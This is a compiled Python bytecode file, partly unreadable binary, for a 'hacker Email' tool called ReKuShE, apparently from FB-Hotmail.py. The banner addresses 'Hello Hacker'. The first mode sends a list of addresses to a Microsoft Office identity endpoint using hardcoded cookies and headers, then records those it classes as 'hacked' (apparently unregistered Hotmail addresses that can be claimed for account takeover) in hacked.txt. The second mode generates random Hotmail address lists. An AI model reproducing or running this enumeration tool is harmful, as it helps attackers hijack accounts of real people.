a
    	ɣ_&  �                	   @   s�  d dl Z d dlZd dlZd dlZejdkr6e �d� n ejdkrLe �d� n
e �d� dZee� ed� ed� ed	�Z	e	d
k�r*d dlZd dlZd dl
mZ d dlZd dlZd dl Z d dlmZ d dlmZ dZdZed	� dd� Ze �d� ed� ed� ed� ed	� dd� Zedk�r*e�  e	dk�r�d dlZd dlZd dl Z d dlZe �d� ed� ed� ed� ed� ed	� ed� ed� ed	� ed�Zed� ed �Zed� ed!�Zed� ed"�Zee�Zed� ed#�Zee�Zed$� ee�D ]�Zd	Zee�D ]
Z d	Z!�qee�D ]Z e!e�"e�7 Z!�q*eee! e � e#d%d&��&Z$e$�%ee! e d' � W d  � n1 �s�0    Y  �qdS )(�    NZlinux2�clearZwin32�clsu/  
[1;96m ============================================================
                __________
                      .~#########%%;~.
                     /############%%;`                    /######/~\/~\%%;,;,                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|"
          XX       |##/~~\####%;;;/~~\;,|       XX"
        XX..X      |#|  o  "\##%;/  o  |.|      X..XX
      XX.....X     |##"\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X
X  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@  Tool  v1.1       @#%,.@
                @#%,.@              @#%,.@
                  @#%,.@          @#%,.@
                     @#%,.@      @#%,.@
                       @#%.,@  @#%,.@
                         ReKuShE Tool 
[1;96m [¤] [1;93mHello Hacker[1;96m  [1;96m   [¤] [1;93mTelegram : @Professional_school[1;96m
[1;96m [¤] [1;93mReKuShE number one[1;96m      [¤] [1;93mThe tool : hacker Email[1;96m
[1;96m [¤] [1;93mTOOLS ReKuShE-One[1;96m  [¤] [1;93mYOUTUBE  : https://www.youtube.com/iraqhacker[1;96m
 [1;93m=============================================================z       1-    hacker --- Email z         2-   List ---- Email � �1)�BeautifulSoup)�Fore)�sleepz[0;36mz[1;32mc                 C   s0   | d D ]"}t j�|� t j��  td� qd S )N�
g�������?)�sys�stdout�write�flushr   )�sZASU� r   �code/FB-Hotmail.py�ketikC   s    
r   � u$    FB  Email Brute For ×{ ReKuShE }×g      �?c                  C   s�   t d�} t| d��� �� }|D ]�}d| d }d}dddd	d
ddddddd�}tj|||d�}d|jv r�td� ttj	d | � qd|jv rtd� tt
d | � tdd��}|�|d � W d   � n1 s�0    Y  td� td� qd S )NzEnter list email  -> �rzFhttps://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=z&_=1604288577990r   z*/*z!application/x-www-form-urlencodedzrMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36�closezodc.officeapps.live.comzgzip, deflatezLhttps://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0zar,en-US;q=0.9,en;q=0.8a  BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3cZ d06e1498e7ed4def9078bd46883f187bz<xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354)ZAcceptzContent-Typez
User-AgentZ
ConnectionZHostzAccept-EncodingZRefererzAccept-LanguageZcanaryZuaidZCookie)�data�headersZ	MSAccountz - - - - - - - - - - - - - - -z
not hack: ZNeitherz	hacked : z
hacked.txt�ar	   )�input�open�read�
splitlines�requests�get�text�printr   ZRED�green_colorr   )ZssZbpass�passwordZaaaZpayloadr   Zresponse�xr   r   r   �hotmailQ   s8    �

,r#   �__main__�2zrm list.txtz)=========================================u    × Domain email × : z    @hotmail.comz  type ABC 123 z)================ ReKuShE ================z
username  ztype ABC 123 zDomain email zWhat is a number List zNumber of mattressesz"==================================zlist.txtr   r	   )&�osr
   Zhashlibr   �platform�systemZ
__banner__r   r   ZrekZbs4r   ZjsonZ
webbrowserZcoloramar   �timer   �Wr    r   r#   �__name__ZrandomZuesrZreku1ZemailZreku�intZreku2�ranger!   �itemZreku3Zchoicer   r"   r   r   r   r   r   �<module>   s�   




$


